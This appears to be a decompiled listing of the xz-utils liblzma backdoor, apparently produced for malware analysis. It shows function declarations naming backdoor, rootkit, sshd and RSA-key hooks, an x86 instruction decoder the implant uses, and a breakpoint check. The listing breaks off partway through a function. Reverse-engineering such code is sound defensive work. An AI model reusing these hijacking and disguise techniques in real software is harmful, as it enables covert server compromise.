#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 __fastcall code_dasm(_DWORD *, unsigned __int64, unsigned __int64);
__int64 __fastcall Llzma_optimum_normal_0(unsigned __int64 a1, unsigned __int64 a2, __int64 a3, char *a4);
__int64 __fastcall Llzma_filters_update_0(unsigned __int64 a1, unsigned __int64 a2, int a3, int a4, char *a5);
__int64 __fastcall Llzma_filters_update_1(unsigned __int64 a1, unsigned __int64 a2, int a3, int a4, char *a5);
__int64 __fastcall Llzma_raw_encoder_0(unsigned __int64 a1, unsigned __int64 a2, __int64 a3);
__int64 __fastcall Llzma_mt_block_size_1(unsigned __int64, unsigned __int64, char *, __int64);
__int64 __fastcall Lstream_encode_1(unsigned __int64 a1, unsigned __int64 a2, __int64 a3);
__int64 __fastcall Llzma_properties_size_0(unsigned __int64 a1, unsigned __int64 a2, char *a3, int a4, __int64 a5);
__int64 __fastcall Lstream_encoder_mt_init_1(unsigned __int64 a1, unsigned __int64 a2, char *a3, __int64 a4);
__int64 __fastcall process_elf_seg(struct_elf_info *a1, unsigned __int64 a2, unsigned __int64 a3, __int64 ptflags);
__int64 __fastcall parse_elf(Elf64_Ehdr *elf_hdr, struct_elf_info *elf_info);
char *__fastcall import_lookup_get_str(struct_elf_info *a1, int hash, int a3);
unsigned __int64 __fastcall sub_1B20(unsigned __int64, unsigned __int64, __int64);
__int64 __fastcall Llz_encode_1(struct_elf_info *a1, _QWORD *JMPREL_addr, unsigned int plt_num, __int64 a4, int tre_hash);
__int64 __fastcall Ldelta_coder_end_1(struct_elf_info *a1, int tre_hash);
__int64 __fastcall Ldelta_decode_part_0(__int64 a1, int a2);
unsigned __int64 __fastcall Llzma_check_update_0(__int64, unsigned __int64 *);
unsigned __int64 __fastcall Lindex_tree_append_part_0(__int64 a1, unsigned __int64 *a2);
char *__fastcall Llzip_decode_0(__int64 a1, unsigned int *a2, char *a3);
__int64 __fastcall maybe_find_freespaces(struct_elf_info *, unsigned __int64 *, int);
__int64 __fastcall Lauto_decode_1(struct_elf_info *a1, unsigned __int64 a2, unsigned __int64 a3, int a4);
__int64 __fastcall Lhc_find_func_1(unsigned __int64 a1, __int64 a2, __int64 a3);
struc_Lencoder *__fastcall get__Lencoder_1_addr();
__int64 __fastcall sub_2540(_QWORD *a1, __int64 a2, struct_elf_info *a3, __int64 a4);
__int64 __fastcall backdoor_vtbl_init(struc_vtbl *a1);
unsigned __int64 __fastcall sub_2C50(unsigned int a1, __int64 a2, unsigned __int64 a3, __int64 a4);
__int64 __fastcall sub_2FE0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 *a5, __int64 a6);
__int64 __fastcall Llzma_auto_decode_1(__int64 a1, unsigned int a2, unsigned __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_3330(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 *a5, __int64 a6);
__int64 __fastcall Llzma_buf_cpy_0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, __int64 a5, __int64 *a6);
__int64 __fastcall Llzma_check_finish_0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall Llzma_decoder_init_1(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall Llzma_delta_coder_init_1(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall traversal_dynstr_sshd(struct_elf_info *a1, char **a2);
_BOOL8 __fastcall sub_3B70(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4);
__int64 __fastcall parse_elf_invoke(elf_parse_result *a1);
__int64 __fastcall Llzma_lzma2_encoder_memusage_0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall set_rkctx_cpuid(rootkit_ctx *a1);
__int64 __fastcall get_ehdr_address(rootkit_ctx *a1);
__int64 __fastcall Llzma_block_param_decoder_0(__int64 a1, int a2);
void *__fastcall set_rkctx_self(rootkit_ctx *a1);
__int64 __fastcall backdoor_ctx_save(rootkit_ctx *ctx);
lzma_allocator *__fastcall get_lzma_allocator(_QWORD);
__int64 __fastcall Llzma_filter_flags_decode_0(struct_elf_info *a1, struct_elf_info *a2, _QWORD *a3, __int64 a4);
__int64 __fastcall Llzma_index_buffer_encode_0(Elf64_Ehdr **p_elf, struct_elf_info *a2, struct_ctx *ctx);
_BOOL8 __fastcall process_shared_libraries_map(Elf64_Ehdr **a1, parse_lib *lib);
__int64 __fastcall Llzma_index_iter_locate_1(__int64, __int64);
__int64 __fastcall Llzma_index_hash_init_part_0(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall parse_elf_init(struc_init22 *init);
__int64 __fastcall backdoor_init_stage2(rootkit_ctx *ctx, _QWORD *unused, _QWORD *cpuid_got_ptr, struc_gots *gots);
__int64 __fastcall sub_7080(char *a1, __int64 a2);
__int64 __fastcall sub_70B0(int a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_7120(int, __int64, __int64, __int64);
__int64 __fastcall sub_71A0(__int64 a1, unsigned int a2);
__int64 __fastcall sub_71C0(__int64 a1, unsigned int a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
_BOOL8 __fastcall sub_72E0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4, __int64 a5);
__int64 __fastcall sub_7350(__int64 a1, unsigned __int64 a2, _QWORD *a3, __int64 a4, __int64 a5);
__int64 sub_7430(__int64 a1, unsigned int a2, __int64 a3, ...);
__int64 __fastcall sub_74E0(__int64 a1, unsigned __int64 *a2, __int64 a3);
__int64 __fastcall sub_7540(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_7660(__int64 a1, __int64 a2, unsigned __int64 a3, unsigned __int64 a4, __int64 a5, __int64 a6, __int64 a7);
__int64 __fastcall Llength_encoder_reset_0(_QWORD *a1);
_BOOL8 __fastcall Lstream_decoder_mt_get_progress_0(unsigned __int64 *a1, __int64 a2, unsigned __int64 *a3, __int64 *a4);
_BOOL8 __fastcall Lthreads_stop_0(__int64 a1, __int64 a2);
__int64 __fastcall Llzma_block_unpadded_size_1(int a1, int a2, int a3, int a4, __int64 a5);
__int64 __fastcall Llzma_rc_prices_1(char *a1, __int64 a2);
__int64 __fastcall Lstream_encoder_mt_init_part_0(__int64 a1);
__int64 __fastcall Lworker_start_0(char **a1, unsigned __int64 a2, _QWORD *a3, __int64 a4);
__int64 __fastcall Lbt_skip_func_part_0(__int64 a1, int a2);
_BOOL8 __fastcall Lparse_lzma12_0(__int64 a1, __int64 a2);
__int64 __fastcall Ldecode_buffer_part_0(__int64 a1, unsigned __int64 a2, __int64 a3);
__int64 __fastcall Lfile_info_decode_0(__int64 a1, unsigned int a2, unsigned __int64 *a3);
__int64 __fastcall check_special_rsa_key(__int64, __int64, _DWORD *);
__int64 __fastcall Llzma_index_memusage_part_0(__int64 a1, __int64 a2);
__int64 __fastcall cpuid(unsigned int, _DWORD *, _DWORD *, _DWORD *, _DWORD *);
__int64 __fastcall hijacked_cpuid(unsigned int edi0, _DWORD *);
__int64 __fastcall backdoor_init(rootkit_ctx *ctx, _DWORD *rbp_m10);
char *__fastcall table_get(char *a1, unsigned __int64 a2);
_BOOL8 __fastcall apply_one_entry_ex(unsigned __int64, unsigned int, unsigned int, unsigned int);
__int64 __fastcall Llzma_index_iter_rewind_cold(unsigned int, unsigned int, unsigned int, int);
__int64 __fastcall Llzma_block_total_size_0(unsigned __int64 a1, unsigned __int64 a2, __int64 a3);
// __int64 __fastcall lzma_check_init(_QWORD, _QWORD); weak
// __int64 __fastcall lzma_free(_QWORD, _QWORD); weak
// __int64 __fastcall lzma_alloc(_QWORD, _QWORD); weak

//-------------------------------------------------------------------------
// Data declarations

__int64 addr_hinter = 0LL; // weak
struc_gots ro_gots = { -7528LL, 8LL, -23592LL };
__int64 rodata_ptr_offset = 0LL; // weak
__int64 *Lfilter_optmap_0 = &unk_C870; // weak
struct_ctx *global_ctx;
int global_counter; // weak


//----- (0000000000000010) ----------------------------------------------------
__int64 __fastcall code_dasm(_DWORD *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  _DWORD *v5; // rbx
  unsigned __int64 v6; // rcx
  unsigned __int8 *v7; // rdx
  bool i; // cf
  int v9; // eax
  __int64 v10; // rsi
  char v11; // al
  char v12; // al
  char v13; // al
  char v14; // al
  char v15; // cl
  unsigned __int8 v16; // di
  unsigned __int8 *v17; // rsi
  char v18; // al
  unsigned __int8 v19; // r8
  int v20; // eax
  char v21; // cl
  char v22; // si
  int v23; // eax
  unsigned int v24; // r8d
  __int64 v25; // r10
  int v26; // esi
  unsigned __int64 v27; // rsi
  __int64 v28; // rdi
  __int64 v29; // rcx
  char v30; // cl
  __int64 v31; // rdx
  int v32; // ecx
  unsigned __int8 v33; // si
  unsigned __int8 v34; // si
  __int64 v35; // rcx
  int v36; // r8d
  int v37; // eax
  int v39; // ecx
  int v40; // r8d
  __int64 v41; // rdi
  int v42; // ecx
  int v43; // edi
  bool v44; // cc
  char v45; // si
  unsigned __int8 v46; // cl
  bool v47; // zf
  unsigned __int8 *v48; // rdx
  unsigned __int8 *v49; // rdx
  __int64 v50; // rax
  __int64 v51; // rsi
  bool v52; // zf
  unsigned __int8 *v53; // rdx
  __int64 v54; // rdi
  unsigned __int64 v55; // rax
  __int64 v56; // rax
  unsigned __int8 *v57; // rsi
  char v58; // cl
  unsigned __int64 v59; // rax
  char v60; // si
  unsigned __int8 v61; // al
  char v62; // al
  int v63; // ecx
  char v64; // di
  char v65; // cl
  bool v66; // zf
  unsigned __int8 v67; // cl
  char v68; // cl
  char v69; // cl
  char v70; // cl
  __int64 v71; // rcx
  _DWORD *v72; // rdi
  char v73; // si
  char v74; // cl
  int v75; // eax
  int v76; // eax
  __int64 v77; // rcx
  _DWORD *v78; // rdi
  __int64 v79[7]; // [rsp+0h] [rbp-38h]

  v5 = a1;
  if ( !(unsigned int)apply_one_entry_ex(0LL, 18LL, 70LL, 2LL) )
    return 0LL;
  v6 = 22LL;
  v7 = (unsigned __int8 *)a2;
  while ( v6 )
  {
    *a1++ = 0;
    --v6;
  }
  for ( i = a2 < a3; ; i = (unsigned __int64)v7 < a3 )
  {
    if ( !i )
      goto LABEL_235;
    v9 = *v7;
    if ( (unsigned __int8)v9 > 0x67u )
      break;
    if ( (unsigned __int8)v9 <= 0x2Du )
    {
      if ( (_BYTE)v9 == 15 )
      {
        v5[10] = 15;
        ++v7;
        goto LABEL_42;
      }
      if ( (_BYTE)v9 != 38 )
        goto LABEL_38;
LABEL_23:
      v12 = *((_BYTE *)v5 + 16);
      if ( (v12 & 2) != 0 )
        return 0LL;
      *((_BYTE *)v5 + 16) = v12 | 2;
      *((_BYTE *)v5 + 21) = *v7;
LABEL_31:
      ++v7;
      continue;
    }
    v10 = 0xC0000000010101LL;
    v6 = (unsigned int)(v9 - 46);
    if ( _bittest64(&v10, v6) )
      goto LABEL_23;
    if ( (_BYTE)v9 == 103 )
    {
      v14 = *((_BYTE *)v5 + 16);
      if ( (v14 & 8) != 0 )
        return 0LL;
      *((_BYTE *)v5 + 16) = v14 | 8;
      *((_BYTE *)v5 + 23) = *v7;
      goto LABEL_31;
    }
    if ( (_BYTE)v9 != 102 )
    {
      if ( (v9 & 0xF0) == 64 )
      {
        *((_BYTE *)v5 + 16) |= 0x20u;
        v18 = *v7++;
        *((_BYTE *)v5 + 27) = v18;
      }
LABEL_38:
      if ( (unsigned __int64)v7 >= a3 )
        goto LABEL_235;
      LOBYTE(v6) = *v7;
      if ( *v7 == 15 )
      {
        v5[10] = 15;
        v17 = v7;
        goto LABEL_41;
      }
      v23 = (unsigned __int8)v6;
      v24 = v6 & 7;
      v25 = (unsigned __int8)v6 >> 3;
      v26 = byte_ADA0[v25];
      if ( _bittest(&v26, v24) )
        return 0LL;
      v5[10] = (unsigned __int8)v6;
      v79[0] = 0x3030303030303030LL;
      *((_BYTE *)v5 + 80) = (_BYTE)v7 - a2;
      v79[1] = 0xFFFF0FC000000000LL;
      v79[2] = 0xFFFF03000000000BLL;
      v79[3] = 0xC00BFF000025C7LL;
      v27 = ((unsigned __int64)v79[(unsigned __int8)v6 >> 6] >> v6) & 1;
      if ( (((unsigned __int64)v79[(unsigned __int8)v6 >> 6] >> v6) & 1) != 0 )
      {
        if ( (unsigned __int8)v6 <= 0xF7u )
        {
          if ( (unsigned __int8)v6 > 0xC1u )
          {
            v29 = 1LL << ((unsigned __int8)v6 + 62);
            if ( (v29 & 0x2000C800000020LL) != 0 )
            {
              v27 = 4LL;
            }
            else if ( (v29 & 0x101) != 0 )
            {
              v27 = 2LL;
            }
          }
          else if ( (unsigned __int8)v6 > 0x69u )
          {
            v28 = 0x7F80010000000001LL;
            v6 = (unsigned int)(v6 + 127);
            if ( (unsigned __int8)v6 <= 0x3Eu )
              goto LABEL_66;
          }
          else
          {
            if ( (unsigned __int8)v6 > 0x2Cu )
            {
              v28 = 0x1800000000010101LL;
              v6 = (unsigned int)(v6 - 45);
              goto LABEL_66;
            }
            if ( (unsigned __int8)(v6 - 5) <= 0x20u )
            {
              v28 = 0x2020202020LL;
LABEL_66:
              if ( _bittest64(&v28, v6) )
                v27 = 4LL;
            }
          }
        }
        *((_BYTE *)v5 + 17) |= 8u;
        *((_QWORD *)v5 + 9) = v27;
      }
      else
      {
        *((_QWORD *)v5 + 9) = 0LL;
      }
      if ( (((int)byte_AD80[v25] >> v24) & 1) != 0 )
        goto LABEL_186;
      if ( (unsigned int)(v23 - 160) <= 3 )
      {
        *((_BYTE *)v5 + 17) |= 5u;
LABEL_140:
        v48 = v7 + 1;
LABEL_158:
        if ( (unsigned __int64)v48 >= a3 )
          goto LABEL_235;
        if ( (unsigned __int64)(v48 + 1) >= a3 )
          goto LABEL_235;
        if ( (unsigned __int64)(v48 + 2) >= a3 )
          goto LABEL_235;
        v57 = v48 + 3;
        if ( (unsigned __int64)(v48 + 3) >= a3 )
          goto LABEL_235;
        v58 = *((_BYTE *)v5 + 17);
        *((_QWORD *)v5 + 6) = *v48 | (v48[1] << 8) | (v48[2] << 16) | (v48[3] << 24);
        if ( (v58 & 4) != 0 )
        {
          if ( (unsigned __int64)(v48 + 4) >= a3
            || (unsigned __int64)(v48 + 5) >= a3
            || (unsigned __int64)(v48 + 6) >= a3
            || (unsigned __int64)(v48 + 7) >= a3 )
          {
            goto LABEL_235;
          }
          if ( (v58 & 8) != 0 )
          {
            v49 = v48 + 8;
            goto LABEL_145;
          }
          *(_QWORD *)v5 = a2;
          v56 = (__int64)&v48[-a2 + 8];
          goto LABEL_169;
        }
        if ( (v58 & 8) != 0 )
        {
          v49 = v48 + 4;
          goto LABEL_145;
        }
LABEL_182:
        *(_QWORD *)v5 = a2;
        v56 = (__int64)&v57[-a2 + 1];
        goto LABEL_169;
      }
      v30 = *((_BYTE *)v5 + 17);
      if ( (v30 & 8) == 0 )
      {
        *(_QWORD *)v5 = a2;
        v31 = (__int64)&v7[-a2 + 1];
        goto LABEL_106;
      }
      if ( (v5[4] & 0x20) != 0 && (*((_BYTE *)v5 + 27) & 8) != 0 && (v23 & 0xFFFFFFF8) == 184 )
      {
        *((_QWORD *)v5 + 9) = 8LL;
        *((_BYTE *)v5 + 17) = v30 | 0x10;
        *((_BYTE *)v5 + 32) = v24;
        v5[10] = 184;
      }
LABEL_144:
      v49 = v7 + 1;
      goto LABEL_145;
    }
    v13 = *((_BYTE *)v5 + 16);
    if ( (v13 & 4) != 0 && *((_BYTE *)v5 + 22) != 102 )
      return 0LL;
    if ( (v13 & 0x20) == 0 )
    {
      *((_BYTE *)v5 + 16) |= 4u;
      *((_BYTE *)v5 + 22) = *v7;
    }
    ++v7;
  }
  if ( (_BYTE)v9 == 0xF0 )
  {
LABEL_21:
    v11 = *((_BYTE *)v5 + 16);
    if ( (v11 & 1) != 0 )
      return 0LL;
    *((_BYTE *)v5 + 16) = v11 | 1;
    *((_BYTE *)v5 + 20) = *v7;
    goto LABEL_31;
  }
  if ( (unsigned __int8)v9 > 0xF0u )
  {
    if ( (unsigned __int8)(v9 + 14) > 1u )
      goto LABEL_38;
    goto LABEL_21;
  }
  v6 = (unsigned int)(v9 + 60);
  if ( (unsigned __int8)(v9 + 60) > 1u )
    goto LABEL_38;
  v15 = *((_BYTE *)v5 + 16);
  if ( (v15 & 0x20) != 0 )
    return 0LL;
  v5[10] = v9;
  v16 = *v7;
  v17 = v7 + 1;
  *((_BYTE *)v5 + 16) = v15 | 0x10;
  *((_BYTE *)v5 + 24) = v16;
  if ( (unsigned __int64)(v7 + 1) >= a3 )
  {
LABEL_235:
    v77 = 22LL;
    v78 = v5;
    while ( v77 )
    {
      *v78++ = 0;
      --v77;
    }
    return 0LL;
  }
  v19 = v7[1];
  *((_BYTE *)v5 + 27) = 64;
  v20 = (v9 << 8) | 0xF;
  *((_BYTE *)v5 + 25) = v19;
  v5[10] = v20;
  v21 = (((char)v7[1] >> 7) & 0xFC) + 68;
  *((_BYTE *)v5 + 27) = v21;
  if ( v16 == 0xC5 )
  {
LABEL_41:
    v7 = v17 + 1;
    goto LABEL_42;
  }
  if ( v16 != 0xC4 )
    return 0LL;
  v22 = v7[1] & 0x1F;
  if ( (v7[1] & 0x40) == 0 )
    *((_BYTE *)v5 + 27) = v21 | 2;
  if ( (v7[1] & 0x20) == 0 )
    *((_BYTE *)v5 + 27) |= 1u;
  if ( (unsigned __int8)(v22 - 1) > 2u )
    return 0LL;
  if ( (unsigned __int64)(v7 + 2) >= a3 )
    goto LABEL_235;
  v73 = v7[2];
  v74 = v19 & 0x1F;
  *((_BYTE *)v5 + 26) = v73;
  if ( v73 >= 0 )
    *((_BYTE *)v5 + 27) |= 8u;
  v75 = v20 << 8;
  v5[10] = v75;
  if ( v74 == 2 )
  {
    v76 = v75 | 0x38;
    goto LABEL_232;
  }
  if ( v74 != 3 )
  {
    if ( v74 != 1 )
      return 0LL;
    v7 += 3;
LABEL_42:
    if ( (unsigned __int64)v7 >= a3 )
      goto LABEL_235;
    v32 = v5[10] << 8;
    v5[10] = v32;
    v23 = v32 | *v7;
    v5[10] = v23;
    v33 = *v7;
    if ( (*v7 & 0xFD) == 56 )
    {
      if ( (v5[4] & 0x10) != 0 )
        return 0LL;
      ++v7;
      goto LABEL_86;
    }
    if ( (((int)byte_AD60[v33 >> 3] >> (v33 & 7)) & 1) == 0 )
      return 0LL;
    if ( *((_BYTE *)v5 + 20) == 0xF3 && v33 == 30 )
    {
      if ( (unsigned __int64)(v7 + 1) >= a3 )
        goto LABEL_235;
      v71 = 18LL;
      v72 = v5 + 4;
      while ( v71 )
      {
        *v72++ = 0;
        --v71;
      }
      *(_QWORD *)v5 = a2;
      *((_QWORD *)v5 + 1) = 4LL;
      v37 = 2 * (v7[1] == 0xFA) + 42492;
      goto LABEL_108;
    }
    v34 = v23;
    *((_BYTE *)v5 + 80) = (_BYTE)v7 - a2;
    if ( (v5[4] & 0x10) != 0 )
      v34 = v23;
    if ( (v34 & 0xF0) == 128 )
    {
      v35 = 4LL;
LABEL_102:
      *((_BYTE *)v5 + 17) |= 8u;
      *((_QWORD *)v5 + 9) = v35;
      goto LABEL_103;
    }
    if ( v34 > 0x73u )
    {
      if ( (unsigned int)v34 - 164 <= 0x22 && ((0x740400101uLL >> (v34 + 92)) & 1) != 0 )
        goto LABEL_101;
    }
    else if ( v34 > 0x6Fu )
    {
LABEL_101:
      v35 = 1LL;
      goto LABEL_102;
    }
    *((_QWORD *)v5 + 9) = 0LL;
LABEL_103:
    v36 = byte_AD40[v34 >> 3];
    if ( _bittest(&v36, v34 & 7) )
      goto LABEL_186;
    if ( (*((_BYTE *)v5 + 17) & 8) != 0 )
      goto LABEL_144;
    *(_QWORD *)v5 = a2;
    v31 = (__int64)&v7[-a2 + 1];
    goto LABEL_106;
  }
  v76 = v75 | 0x3A;
LABEL_232:
  v5[10] = v76;
  v7 += 3;
LABEL_86:
  if ( (unsigned __int64)v7 >= a3 )
    goto LABEL_235;
  v39 = v5[10] << 8;
  v5[10] = v39;
  v23 = v39 | *v7;
  v5[10] = v23;
  v40 = v23 & 0xFF00;
  if ( v40 != 14336 )
  {
    v23 = (unsigned __int8)v23;
    if ( (unsigned __int8)v23 <= 0xF0u )
    {
      if ( (unsigned __int8)v23 > 0xCBu )
      {
        if ( ((0x1000080001uLL >> ((unsigned __int8)v23 + 52)) & 1) != 0 )
          goto LABEL_122;
      }
      else
      {
        if ( (unsigned __int8)v23 > 0x39u )
        {
          v44 = (unsigned int)(unsigned __int8)v23 - 96 <= 3;
        }
        else
        {
          if ( (unsigned __int8)v23 > 0x37u )
            goto LABEL_122;
          v44 = (unsigned int)(unsigned __int8)v23 - 32 <= 2;
        }
        if ( v44 )
        {
LABEL_122:
          *((_BYTE *)v5 + 80) = (_BYTE)v7 - a2;
          if ( v40 != 14848 )
          {
LABEL_141:
            *((_QWORD *)v5 + 9) = 0LL;
            goto LABEL_186;
          }
LABEL_137:
          *((_BYTE *)v5 + 17) |= 8u;
          *((_QWORD *)v5 + 9) = 1LL;
          goto LABEL_186;
        }
      }
    }
    v45 = (unsigned __int8)v23 >> 4;
    v46 = v23 & 0xF;
    if ( (unsigned __int8)v23 >> 4 == 1 )
    {
      if ( v46 > 9u )
      {
        if ( v46 != 13 )
          return 0LL;
        goto LABEL_135;
      }
      v47 = (v23 & 0xC) == 0;
    }
    else if ( v45 == 4 )
    {
      v47 = ((0x1C57uLL >> v46) & 1) == 0;
    }
    else
    {
      if ( v45 )
        return 0LL;
      v47 = (v23 & 0xB) == 3;
    }
    if ( v47 )
      return 0LL;
LABEL_135:
    *((_BYTE *)v5 + 80) = (_BYTE)v7 - a2;
    if ( v40 != 14848 || (unsigned int)(v23 - 74) <= 2 )
      goto LABEL_141;
    goto LABEL_137;
  }
  v41 = (unsigned __int8)v23 >> 3;
  v42 = byte_AD20[v41];
  if ( !_bittest(&v42, v23 & 7) )
    return 0LL;
  *((_QWORD *)v5 + 9) = 0LL;
  v43 = byte_AD00[v41];
  *((_BYTE *)v5 + 80) = (_BYTE)v7 - a2;
  if ( !_bittest(&v43, v23 & 7) )
  {
    if ( (*((_BYTE *)v5 + 17) & 8) != 0 )
      goto LABEL_144;
    *(_QWORD *)v5 = a2;
    v31 = (__int64)&v7[-a2 + 1];
    goto LABEL_106;
  }
LABEL_186:
  if ( (unsigned __int64)++v7 >= a3 )
    goto LABEL_235;
  v60 = *((_BYTE *)v5 + 16);
  *((_BYTE *)v5 + 16) = v60 | 0x40;
  v61 = *v7;
  *((_BYTE *)v5 + 28) = *v7;
  v62 = v61 >> 6;
  *((_BYTE *)v5 + 29) = v62;
  v63 = ((int)*v7 >> 3) & 7;
  *((_BYTE *)v5 + 30) = ((int)*v7 >> 3) & 7;
  v64 = *v7 & 7;
  *((_BYTE *)v5 + 31) = v64;
  if ( v62 == 3 )
  {
LABEL_188:
    if ( (v5[7] & 0xFF00FF00) == 83886080 )
      goto LABEL_195;
  }
  else
  {
    if ( v64 == 4 )
      *((_BYTE *)v5 + 16) = v60 | 0xC0;
    if ( v62 == 1 )
    {
      *((_BYTE *)v5 + 17) |= 3u;
    }
    else
    {
      if ( v62 != 2 )
        goto LABEL_188;
LABEL_195:
      *((_BYTE *)v5 + 17) |= 1u;
    }
  }
  v23 = v5[10];
  if ( (unsigned int)(v23 - 246) <= 1 && (_BYTE)v63 )
  {
    *((_BYTE *)v5 + 17) &= ~8u;
    *((_QWORD *)v5 + 9) = 0LL;
  }
  if ( *((char *)v5 + 16) >= 0 )
  {
    v65 = *((_BYTE *)v5 + 17);
    if ( (v65 & 2) != 0 )
    {
      ++v7;
LABEL_216:
      if ( (unsigned __int64)v7 >= a3 )
        goto LABEL_235;
      v66 = (*((_BYTE *)v5 + 17) & 8) == 0;
      *((_QWORD *)v5 + 6) = (char)*v7;
    }
    else
    {
      if ( (v65 & 1) != 0 )
        goto LABEL_140;
      v66 = (v65 & 8) == 0;
    }
    if ( !v66 )
      goto LABEL_144;
    *(_QWORD *)v5 = a2;
    v31 = (__int64)&v7[-a2 + 1];
    goto LABEL_106;
  }
  if ( (unsigned __int64)(v7 + 1) >= a3 )
    goto LABEL_235;
  v67 = v7[1];
  *((_BYTE *)v5 + 33) = v67;
  *((_BYTE *)v5 + 34) = v67 >> 6;
  *((_BYTE *)v5 + 35) = ((int)v7[1] >> 3) & 7;
  v68 = v7[1] & 7;
  *((_BYTE *)v5 + 36) = v68;
  if ( v68 == 5 )
  {
    v69 = *((_BYTE *)v5 + 29);
    if ( (v69 & 0xFD) != 0 )
    {
      if ( v69 == 1 )
        *((_BYTE *)v5 + 17) |= 3u;
    }
    else
    {
      *((_BYTE *)v5 + 17) |= 1u;
    }
  }
  v70 = *((_BYTE *)v5 + 17);
  if ( (v70 & 2) != 0 )
  {
    v7 += 2;
    goto LABEL_216;
  }
  if ( (v70 & 1) != 0 )
  {
    v48 = v7 + 2;
    goto LABEL_158;
  }
  if ( (v70 & 8) == 0 )
  {
    *(_QWORD *)v5 = a2;
    v31 = (__int64)&v7[-a2 + 2];
LABEL_106:
    *((_QWORD *)v5 + 1) = v31;
    if ( !v31 )
      return 0LL;
LABEL_107:
    v37 = v23 + 128;
LABEL_108:
    v5[10] = v37;
    return 1LL;
  }
  v49 = v7 + 2;
LABEL_145:
  if ( (unsigned __int64)v49 >= a3 )
    goto LABEL_235;
  v50 = *((_QWORD *)v5 + 9);
  v51 = *v49;
  if ( v50 == 1 )
  {
    *((_QWORD *)v5 + 8) = v51;
    v52 = &v49[1 - a2] == 0LL;
    *((_QWORD *)v5 + 7) = (char)v51;
    *(_QWORD *)v5 = a2;
    *((_QWORD *)v5 + 1) = &v49[1 - a2];
    goto LABEL_170;
  }
  v53 = v49 + 1;
  if ( (*((_QWORD *)v5 + 2) & 0xFF000000000004LL) == 0x66000000000004LL )
  {
    if ( v50 == 2 )
    {
      *((_QWORD *)v5 + 9) = 4LL;
    }
    else if ( v50 == 4 )
    {
      *((_QWORD *)v5 + 9) = 2LL;
    }
  }
  if ( (unsigned __int64)v53 >= a3 )
    goto LABEL_235;
  v54 = *((_QWORD *)v5 + 9);
  v55 = v51 | ((unsigned __int64)*v53 << 8);
  if ( v54 != 2 )
  {
    if ( (unsigned __int64)(v53 + 1) >= a3 )
      goto LABEL_235;
    v57 = v53 + 2;
    if ( (unsigned __int64)(v53 + 2) >= a3 )
      goto LABEL_235;
    v59 = v55 | ((unsigned __int64)v53[1] << 16) | ((unsigned __int64)v53[2] << 24);
    if ( v54 == 4 )
    {
      *((_QWORD *)v5 + 8) = v59;
      v59 = (int)v59;
    }
    else
    {
      if ( (unsigned __int64)(v53 + 3) >= a3 )
        goto LABEL_235;
      if ( (unsigned __int64)(v53 + 4) >= a3 )
        goto LABEL_235;
      if ( (unsigned __int64)(v53 + 5) >= a3 )
        goto LABEL_235;
      v57 = v53 + 6;
      if ( (unsigned __int64)(v53 + 6) >= a3 )
        goto LABEL_235;
      v59 |= ((unsigned __int64)v53[3] << 32) | ((unsigned __int64)v53[4] << 40) | ((unsigned __int64)v53[5] << 48) | ((unsigned __int64)v53[6] << 56);
      *((_QWORD *)v5 + 8) = v59;
    }
    *((_QWORD *)v5 + 7) = v59;
    goto LABEL_182;
  }
  *((_QWORD *)v5 + 8) = v55;
  *((_QWORD *)v5 + 7) = (__int16)v55;
  v56 = (__int64)&v53[-a2 + 1];
  *(_QWORD *)v5 = a2;
LABEL_169:
  *((_QWORD *)v5 + 1) = v56;
  v52 = v56 == 0;
LABEL_170:
  if ( !v52 )
  {
    v23 = v5[10];
    goto LABEL_107;
  }
  return 0LL;
}
// ABC0: using guessed type __int64 __fastcall Llzma2_decoder_end_1(_QWORD, _QWORD, _QWORD, _QWORD);
// AD00: using guessed type unsigned __int8 byte_AD00[32];
// AD20: using guessed type unsigned __int8 byte_AD20[32];
// AD40: using guessed type unsigned __int8 byte_AD40[32];
// AD60: using guessed type unsigned __int8 byte_AD60[32];
// AD80: using guessed type unsigned __int8 byte_AD80[32];
// ADA0: using guessed type unsigned __int8 byte_ADA0[32];

//----- (0000000000000AB0) ----------------------------------------------------
__int64 __fastcall check_software_breakpoint(_DWORD *a1, __int64 a2, int a3)
{
  unsigned int v4; // edx

  v4 = 0;
  if ( a2 - (__int64)a1 > 3 )
    return *a1 + (a3 | 0x5E20000) == 0xF223;
  return v4;
}

//----- (0000000000000B00) ----------------------------------------------------
__int64 __fastcall sub_B00(_DWORD *a1, unsigned __int64 a2, _QWORD *a3, int a4)
{
  __int64 result; // rax
  unsigned int v7; // ebx
  __int64 *v8; // rdi
  __int64 i; // rcx
  __int64 v10; // [rsp+8h] [rbp-70h] BYREF
  __int64 v11; // [rsp+10h] [rbp-68h]
  int v12; // [rsp+30h] [rbp-48h]

  if ( a4 )
  {
    result = check_software_breakpoint(a1, a2, 0xE230);
    if ( (_DWORD)result )
    {
      if ( a3 )
        *a3 = a1;
      return 1LL;
    }
  }
  else
  {
    v7 = 0;
    v8 = &v10;
    for ( i = 22LL; i; --i )
    {
      *(_DWORD *)v8 = 0;
      v8 = (__int64 *)((char *)v8 + 4);
    }
    if ( (unsigned int)code_dasm(&v10, (unsigned __int64)a1, a2)
      && v12 == 0xF9F
      && (((_BYTE)v10 + (_BYTE)v11) & 0xF) == 0 )
    {
      if ( a3 )
        *a3 = v10 + v11;
      return 1;
    }
    return v7;
  }
  return result;
}

//----- (0000000000000B90) ----------------------------------------------------
__int64 __fastcall apply_method_1(
        _DWORD *a1,
        __int64 *a2,
        unsigned __int64 *a3,
        _DWORD *a4,
        unsigned __int64 a5,
        int a6)
{
  _DWORD *i; // r15
  __int64 v10; // r15
  _DWORD *v12; // rbx
